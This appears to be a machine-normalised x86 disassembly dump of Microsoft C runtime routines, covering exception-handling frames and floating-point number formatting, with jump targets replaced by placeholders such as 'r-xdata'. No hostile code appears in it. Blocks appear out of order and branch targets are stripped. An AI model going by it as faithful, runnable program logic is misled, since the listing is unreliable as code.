call [ ebp - 0x2c ]
pop ecx
pop ecx
and [ ebp - 0x38 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
leave
retn
mov eax [ ebp - 0x38 ]
sub_4196d5
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_417f3c
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_41aff2
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_4195fe
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_419541
pop ebx
leave
retn
sub_419774
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x10 ]
mov esi [ edi + 0xc ]
mov [ ebp - 0x4 ] eax
mov ebx esi
jmp r-xdata
mov [ ebp + 0x8 ] esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp + 0x14 ]
inc esi
mov [ eax ] esi
mov eax [ ebp + 0x18 ]
mov [ eax ] ebx
cmp ebx [ edi + 0xc ]
ja r-xdata
mov ecx [ ebp + 0x10 ]
dec esi
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] ecx
jge r-xdata
call sub_416a77
call sub_416a77
cmp esi ebx
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] 0x0
jge r-xdata
dec [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
sub_4197e7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_4165ec
mov eax [ eax + 0x98 ]
mov [ esi + 0x4 ] eax
call sub_4165ec
mov [ eax + 0x98 ] esi
mov eax esi
pop esi
pop ebp
retn
sub_419813
mov edi edi
push ebp
mov ebp esp
call sub_4165ec
mov eax [ eax + 0x98 ]
jmp r-xdata
test eax eax
jne r-xdata
mov ecx [ eax ]
cmp ecx [ ebp + 0x8 ]
je r-xdata
inc eax
pop ebp
retn
xor eax eax
pop ebp
retn
mov eax [ eax + 0x4 ]
sub_41983a
mov edi edi
push ebp
mov ebp esp
push esi
call sub_4165ec
mov esi [ ebp + 0x8 ]
cmp esi [ eax + 0x98 ]
jne r-xdata
call sub_4165ec
mov eax [ eax + 0x98 ]
jmp r-xdata
call sub_4165ec
mov ecx [ esi + 0x4 ]
mov [ eax + 0x98 ] ecx
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp esi ecx
je r-xdata
pop esi
pop ebp
jmp sub_416a77
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax ecx
pop esi
pop ebp
retn
sub_41988c
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_4195cb
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_41b0e0
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_41990b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_4135f1
mov esi [ ebp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_419355
cmp eax 0x65
jmp r-xdata
pop ecx
jne r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_41b1ae
test eax eax
movsx eax [ esi ]
push eax
call sub_419355
pop ecx
cmp eax 0x78
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov al [ esi ]
mov cl [ ecx ]
mov [ esi ] cl
inc esi
add esi 0x2
mov cl [ esi ]
mov [ esi ] al
mov al cl
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
pop esi
cmp [ ebp - 0x4 ] cl
je r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_41997f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_4135f1
mov eax [ ebp + 0x8 ]
mov cl [ eax ]
mov esi [ ebp - 0x10 ]
test cl cl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
je r-xdata
mov edx [ esi + 0xbc ]
mov edx [ edx ]
mov dl [ edx ]
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
jmp r-xdata
inc eax
mov cl [ eax ]
test cl cl
jne r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl dl
je r-xdata
cmp cl 0x65
je r-xdata
mov edx eax
cmp cl 0x45
je r-xdata
dec eax
cmp [ eax ] 0x30
je r-xdata
mov ecx [ esi + 0xbc ]
mov ecx [ ecx ]
push ebx
mov bl [ eax ]
cmp bl [ ecx ]
pop ebx
jne r-xdata
inc eax
mov cl [ edx ]
inc eax
inc edx
mov [ eax ] cl
test cl cl
jne r-xdata
dec eax
sub_419a01
mov edi edi
push ebp
mov ebp esp
fldz
mov eax [ ebp + 0x8 ]
fcomp [ eax ]
fnstsw ax
test ah 0x41
jpe r-xdata
xor eax eax
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
sub_419a1d
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_41b284
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
lea eax [ ebp - 0x8 ]
push eax
call sub_41b1dc
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
add esp 0xc
leave
retn
sub_419a79
mov edi edi
push esi
mov esi eax
test edi edi
je r-xdata
pop esi
retn
push esi
call sub_4169a0
inc eax
push eax
push esi
add esi edi
push esi
call sub_412d60
add esp 0x10
sub_419abe
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_4135f1
xor ecx ecx
cmp ebx ecx
jne r-xdata
cmp [ ebp + 0x8 ] ecx
jbe r-xdata
call sub_416d94
push 0x16
cmp [ ebp + 0xc ] ecx
jle r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
mov eax [ ebp + 0xc ]
jmp r-xdata
push edi
cmp [ ebp + 0x18 ] cl
je r-xdata
call sub_416d94
push 0x22
jmp r-xdata
add eax 0x9
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov edi [ ebp + 0x14 ]
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
mov edx [ ebp + 0x14 ]
xor eax eax
cmp [ ebp + 0xc ] ecx
setg al
xor ecx ecx
cmp [ edx ] 0x2d
sete cl
mov edi eax
add ecx ebx
mov eax ecx
call sub_419a79
pop esi
mov [ eax ] esi
call sub_416d42
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ ebp + 0x18 ] al
sete al
add eax [ ebp + 0xc ]
add esi eax
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
mov cl [ esi + 0x1 ]
mov eax [ ebp - 0x10 ]
mov [ esi ] cl
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
inc esi
mov [ esi ] al
sub ebx esi
add ebx [ ebp + 0x8 ]
or ebx 0xffffffff
jmp r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_416cf0
int3
lea ecx [ esi + 0x2 ]
cmp [ ebp + 0x10 ] eax
je r-xdata
push r--data
push ebx
push esi
call sub_416934
add esp 0xc
test eax eax
jne r-xdata
mov eax [ edi + 0xc ]
cmp [ eax ] 0x30
je r-xdata
mov [ esi ] 0x45
test [ rw-data ] 0x1
pop edi
je r-xdata
mov eax [ edi + 0x4 ]
dec eax
jns r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ecx ] 0x30
jne r-xdata
cmp eax 0x64
jl r-xdata
neg eax
mov [ esi + 0x1 ] 0x2d
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x3
lea eax [ ecx + 0x1 ]
push eax
push ecx
call sub_412d60
add esp 0xc
cmp eax 0xa
jl r-xdata
cdq
push 0x64
pop edi
idiv edi
add [ esi + 0x2 ] al
mov eax edx
pop esi
pop ebx
leave
retn
add [ esi + 0x4 ] al
cdq
push 0xa
pop edi
idiv edi
add [ esi + 0x3 ] al
mov eax edx
sub_419c1f
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop ebx
push ebx
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_41b492
add esp 0x14
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
call sub_416d94
mov [ eax ] ebx
call sub_416d42
mov eax ebx
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_417f3c
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
xor ecx ecx
test esi esi
setg cl
sub eax ecx
or eax eax
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x0
push eax
push [ ebp + 0x18 ]
mov eax edi
push esi
push [ ebp + 0x10 ]
call sub_419abe
add esp 0x18
mov [ edi ] 0x0
jmp r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ esi + 0x1 ]
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
xor ecx ecx
test esi esi
setg cl
add eax edi
add ecx eax
push ecx
call sub_41b32c
add esp 0x10
test eax eax
je r-xdata
sub_419ce6
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_419c1f
add esp 0x18
pop ebp
retn
sub_419d06
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] 0x3ff
xor edi edi
mov [ ebp - 0x4 ] 0x30
call sub_4135f1
cmp [ ebp + 0x14 ] edi
jge r-xdata
mov esi [ ebp + 0xc ]
cmp esi edi
jne r-xdata
mov [ ebp + 0x14 ] edi
cmp [ ebp + 0x10 ] edi
jbe r-xdata
call sub_416d94
push 0x16
mov eax [ ebp + 0x14 ]
add eax 0xb
mov [ esi ] 0x0
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x4 ]
mov ecx eax
shr ecx 0x14
mov edx 0x7ff
push ebx
and ecx edx
xor ebx ebx
cmp ecx edx
jne r-xdata
call sub_416d94
push 0x22
jmp r-xdata
pop edi
pop esi
leave
retn
and eax 0x80000000
xor ecx ecx
or ecx eax
je r-xdata
test ebx ebx
jne r-xdata
pop esi
mov [ eax ] esi
call sub_416d42
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov ebx [ ebp + 0x18 ]
test ebx ebx
sete al
dec al
and al 0xe0
add al 0x78
neg ebx
sbb ebx ebx
mov [ esi ] 0x30
mov [ esi + 0x1 ] al
mov ecx [ edi + 0x4 ]
and ebx 0xffffffe0
and ecx 0x7ff00000
xor eax eax
add ebx 0x27
xor edx edx
or eax ecx
jne r-xdata
mov [ esi ] 0x2d
inc esi
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
mov [ esi + 0x2 ] 0x31
add esi 0x3
mov [ esi + 0x2 ] 0x30
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
add esi 0x3
or eax ecx
jne r-xdata
add eax 0xfffffffe
or eax eax
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax ] dl
jmp r-xdata
mov [ ebp - 0x14 ] 0x3fe
jmp r-xdata
mov [ ebp - 0x14 ] edx
jmp r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
mov [ esi ] 0x0
je r-xdata
push 0x0
push [ ebp + 0x14 ]
lea ebx [ esi + 0x2 ]
push eax
push ebx
push edi
call sub_419ce6
add esp 0x14
test eax eax
je r-xdata
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] 0xf0000
cmp eax edx
jbe r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
mov [ ebp - 0x8 ] ecx
ja r-xdata
mov eax esi
inc esi
mov [ ebp + 0xc ] eax
cmp [ ebp + 0x14 ] edx
jne r-xdata
cmp [ ebp + 0x18 ] 0x0
mov [ esi ] 0x30
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi + 0x1 ] al
push 0x65
add esi 0x2
push esi
call sub_41b130
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ esi ] 0x2d
inc esi
pop ebx
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_419400
add ax 0x30
movzx eax ax
cmp eax 0x39
jbe r-xdata
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x18 ] 0x0
sete cl
dec cl
and cl 0xe0
add cl 0x70
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
jmp r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_419400
cmp ax 0x8
jbe r-xdata
mov ecx [ ebp - 0x8 ]
sub [ ebp - 0x4 ] 0x4
mov [ esi ] al
mov eax [ ebp - 0xc ]
shrd eax ecx 0x4
shr ecx 0x4
inc esi
dec [ ebp + 0x14 ]
cmp [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
jge r-xdata
add eax ebx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push 0x30
push esi
call sub_4130d0
add esp 0xc
add esi [ ebp + 0x14 ]
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ esi - 0x1 ]
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp + 0x18 ] 0x0
mov cl 0x34
sete al
dec al
and al 0xe0
add al 0x70
mov [ esi ] al
mov eax [ edi ]
mov edx [ edi + 0x4 ]
call sub_419400
xor ebx ebx
and eax 0x7ff
and edx ebx
sub eax [ ebp - 0x14 ]
push ebx
pop ecx
sbb edx ecx
js r-xdata
mov esi eax
mov [ eax ] 0x30
dec eax
jmp r-xdata
cmp cl 0x46
jne r-xdata
mov [ esi + 0x1 ] 0x2d
add esi 0x2
neg eax
adc edx ebx
neg edx
jg r-xdata
mov cl [ eax ]
cmp cl 0x66
je r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
test edx edx
jl r-xdata
mov ecx 0x3e8
jg r-xdata
mov [ esi + 0x1 ] 0x2b
add esi 0x2
jmp r-xdata
cmp eax ebx
jb r-xdata
inc [ eax - 0x1 ]
mov cl [ eax ]
cmp cl 0x39
jne r-xdata
cmp esi edi
jne r-xdata
jg r-xdata
push ebx
push ecx
push edx
push eax
call sub_41b520
add al 0x30
mov [ esi ] al
inc esi
mov [ ebp - 0x10 ] edx
mov eax ecx
mov edx ebx
cmp esi edi
jne r-xdata
cmp eax ecx
jb r-xdata
mov edi esi
mov [ esi ] 0x30
cmp edx ebx
jl r-xdata
inc cl
mov [ eax ] cl
jmp r-xdata
add bl 0x3a
mov [ eax ] bl
jmp r-xdata
push 0x0
push 0xa
push edx
push eax
call sub_41b520
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov [ ebp - 0x10 ] ebx
test edx edx
jl r-xdata
push 0x0
push 0x64
push edx
push eax
call sub_41b520
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov edx ebx
cmp eax 0x64
jb r-xdata
add al 0x30
mov [ esi ] al
mov [ esi + 0x1 ] 0x0
jg r-xdata
cmp eax 0xa
jb r-xdata
sub_41a07c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x14 ]
mov edi eax
mov esi [ edi + 0x4 ]
mov ebx ecx
lea ecx [ ebp - 0x10 ]
dec esi
call sub_4135f1
test ebx ebx
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
call sub_416d94
push 0x16
pop esi
mov [ eax ] esi
call sub_416d42
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ edi + 0x4 ]
test eax eax
jg r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ edi ] 0x2d
sete al
add eax esi
mov [ eax + ebx ] 0x30
add esi eax
push esi
lea ebx [ esi + 0x1 ]
call sub_4169a0
inc eax
push eax
push esi
push ebx
call sub_412d60
mov [ esi ] 0x30
add esp 0x10
mov esi ebx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push esi
lea ebx [ esi + 0x1 ]
call sub_4169a0
inc eax
push eax
push esi
push ebx
call sub_412d60
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
mov edi [ edi + 0x4 ]
add esp 0x10
test edi edi
jns r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
neg edi
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp + 0xc ] edi
cmp [ ebp + 0xc ] edi
jl r-xdata
mov edi [ ebp + 0xc ]
mov eax ebx
call sub_419a79
push edi
push 0x30
push ebx
call sub_4130d0
add esp 0xc
sub_41a17f
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_41b492
add esp 0x14
test edi edi
jne r-xdata
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
call sub_416d94
mov [ eax ] esi
call sub_416d42
mov eax esi
jmp r-xdata
or eax 0xffffffff
cmp ebx eax
je r-xdata
call sub_416d94
mov [ eax ] esi
call sub_416d42
mov eax esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_417f3c
leave
retn
mov esi [ ebp + 0x14 ]
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx [ ebp - 0x28 ]
add ecx esi
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
add eax edi
push eax
call sub_41b32c
add esp 0x10
test eax eax
je r-xdata
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
mov eax ebx
sete cl
sub eax ecx
pop ebx
push [ ebp + 0x18 ]
lea eax [ ebp - 0x2c ]
push 0x0
push esi
push ebx
mov ecx edi
call sub_41a07c
add esp 0x10
mov [ edi ] 0x0
jmp r-xdata
sub_41a240
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x16
pop edi
push edi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_41b492
add esp 0x14
test esi esi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
call sub_416d94
mov [ eax ] edi
call sub_416d42
mov eax edi
jmp r-xdata
push ebx
mov ebx [ ebp - 0x28 ]
xor eax eax
dec ebx
cmp [ ebp - 0x2c ] 0x2d
sete al
lea edi [ eax + esi ]
cmp ecx 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_417f3c
leave
retn
sub ecx eax
or ecx ecx
jmp r-xdata
mov eax [ ebp - 0x28 ]
dec eax
cmp ebx eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ esi ] 0x0
jmp r-xdata
lea eax [ ebp - 0x2c ]
push eax
push [ ebp + 0x14 ]
push ecx
push edi
call sub_41b32c
add esp 0x10
test eax eax
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x1
push eax
push [ ebp + 0x18 ]
mov eax esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_419abe
add esp 0x18
cmp eax [ ebp + 0x14 ]
jge r-xdata
pop ebx
test cl cl
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x1
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
call sub_41a07c
add esp 0x10
jmp r-xdata
mov al [ edi ]
inc edi
test al al
jne r-xdata
mov [ edi - 0x2 ] al
sub_41a32d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
cmp eax 0x65
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_419c1f
cmp eax 0x45
je r-xdata
cmp eax 0x66
jne r-xdata
cmp eax 0x61
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41a17f
add esp 0x14
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_419d06
jmp r-xdata
cmp eax 0x41
je r-xdata
add esp 0x18
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41a240
jmp r-xdata
sub_41a3b5
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41a32d
add esp 0x1c
pop ebp
retn
sub_41a3d8
mov edi edi
push esi
push 0x30000
push 0x10000
xor esi esi
push esi
call sub_41b5ff
add esp 0xc
test eax eax
je r-xdata
pop esi
retn
push esi
push esi
push esi
push esi
push esi
call sub_416cf0
sub_41a40b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_413803
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_41314a
pop ecx
sub_41a432
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea edx [ eax + 0x8 ]
cmp [ edx ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_416b30
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
test [ edi ] 0x2
je r-xdata
sub_41a491
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xe0434352
je r-xdata
call sub_4165ec
cmp [ eax + 0x90 ] 0x0
jle r-xdata
cmp eax 0xe0434f4d
je r-xdata
xor eax eax
pop ebp
retn
call sub_4165ec
dec [ eax + 0x90 ]
cmp eax 0xe06d7363
jne r-xdata
call sub_4165ec
and [ eax + 0x90 ] 0x0
jmp sub_416a2b
sub_41a4e0
push 0x10
push r--data
call sub_415830
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
cmp [ edi + 0x4 ] 0x80
jg r-xdata
mov esi [ ebx + 0x8 ]
movsx esi [ ebx + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41a5a2
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_4165ec
inc [ eax + 0x90 ]
and [ ebp - 0x4 ] 0x0
mov [ ebx + 0x8 ] esi
call sub_415875
retn
call sub_416a77
call sub_416a77
cmp esi [ edi + 0x4 ]
jl r-xdata
mov eax esi
mov ecx [ edi + 0x8 ]
mov esi [ ecx + eax * 8 ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0x1
cmp [ ecx + eax * 8 + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebx + 0x8 ] esi
push 0x103
push ebx
mov ecx [ edi + 0x8 ]
push [ ecx + eax * 8 + 0x4 ]
call sub_41b0e0
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_41a5bc
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
